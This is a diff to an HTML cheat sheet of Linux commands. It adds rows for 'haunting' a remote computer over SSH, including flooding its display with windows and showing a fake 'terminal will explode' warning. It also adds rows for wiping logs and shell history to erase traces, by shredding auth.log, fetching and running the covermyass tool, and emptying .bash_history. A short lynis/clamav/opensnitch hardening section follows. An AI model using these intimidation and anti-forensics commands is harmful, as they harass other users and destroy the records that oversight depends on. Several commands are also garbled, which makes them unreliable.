@@ -607,7 +607,7 @@ Save wireshark sniffs as pcaps. Avoid http and telnet. <br />
 
 <tr>
 <th>Haunt a Computer Using SSH</th>
-<td>s<br /></td>
+<td>haunt via ssh<br /></td>
 <td>
 $ export DISPLAY=:0.0 (let DISPLAY of remote be open)<br />
 $ xterm <br />
@@ -621,21 +621,68 @@ $ crontab -e <br />
  uncomment  * * * * * beep .... <br />
 $ sudo xterm -maximize -e sudo tcpdump <br />
 $ for i in {1..10}; do sudo xterm -maximize -e sudo tcpdump; done <br />
-(create a `$tcpdump` window reappearing 10 times on being closed.)
+(create a `$tcpdump` window reappearing 10 times on being closed.) <br />
+$ cat warning.txt (warnings) <br />
+xterm -maximized -fullscreen -fa 'Monospace' -fs 19.31 -e whiptail --title "CRITICAL: ACTION CANNOT BE UNDONE" --msgbox "UNAUTHORIZED LOGIN! DATA SAFEGUARD SYSTEM WILL DESTROY THIS TERMINAL IN 10 SECONDS, STAY 30 FEET CLEAR TO AVOID BLAST" --topleft 23 79 <br /><br />
+$ for i in {1..10}; do firefox -new-window "hhtp://www.saikia.one/" ; done <br />
 <br /></td>
 </tr>
 
 <tr>
-<th>Haunt a Computer Using SSH</th>
-<td>s<br /></td>
-<td>s
+<th>Clear the Logs & History on Linux Systems to Delete All Traces</th>
+<td>clear logs and history<br /></td>
+<td>
+```
+$ find / -perm -222 -type d 2>/dev/user (all dir with write permission)
+$ mkdir /dev/shm/.secret
+$ ls /dev/shm
+$ cd /dev/shm/.secret/
+$ nano logs.txt
+$ rm -rf /dev/shm/.secret
+$ cd /var/log/ (all log files)
+$ sudo rm auth.log
+$ wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass
+$ chmod +x covermyass
+$ ./covermyass
+$ shred --help (delete file data permanently which cannot be recovered)
+$ shred -vfzu auth.log ( shred over rm )
+$ sudo rm kernel.log ( or edit )
+$ cd -vfzu /home/username/.bash_history
+$ >.bash_history (it will clear the file)
+
+```
 <br /></td>
 </tr>
 
 <tr>
-<th>Haunt a Computer Using SSH</th>
-<td>s<br /></td>
-<td>s
+<th>Audit & Lock Down Your System</th>
+<td>with lynis<br /></td>
+<td>
+```
+$ sudo wget 'https://github.com/CISOfy/lynis/archive/master.zip'
+$ sudo unzip
+$ cd lynis-master
+$ sudo chmod +x lynis
+$ sudo ./lynis audit system
+$ sudo apt-get install clamav
+$ sudo clamscan -r / --log=mp/clamav_report.log (complete scan of system - all file)
+$ sudo clamscan -ir malware
+
+opensnitch:
+$ sudo apt install protobuf-compiler libpcap-dev libnetfilter-queue-dev python3-pip golang git go-dep
+$ go get github.com/golang/protobuf/protoc-gen-go (step 3)
+$ python3 -m pip install --user grpcio-tools (step 1)
+$ go get github.com/evilsocket/opensnitch (step 2)
+$ echo 'export GOPATH=$HOME/go' >> ~/.bashrc
+$ source ~/.bashrc
+$ make
+$ sudo make install
+$ sudo systemctl enable opensnitchd
+
+system logs:
+$ find /var/log/ -type f \( -name "*.log" \) -exec tail -f "$file" {} +
+
+```
 <br /></td>
 </tr>
 
